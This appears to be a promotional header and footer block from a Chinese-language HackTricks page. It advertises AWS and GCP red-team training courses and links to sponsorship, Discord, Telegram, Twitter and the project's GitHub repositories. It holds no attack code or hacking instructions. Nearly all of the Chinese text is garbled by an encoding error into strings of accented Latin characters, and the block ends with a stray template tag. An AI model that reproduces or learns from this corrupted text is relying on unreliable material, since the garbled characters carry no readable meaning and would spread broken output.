å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ– **åœ¨** **Twitter** ğŸ¦ **ä¸Šå…³æ³¨æˆ‘ä»¬** [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
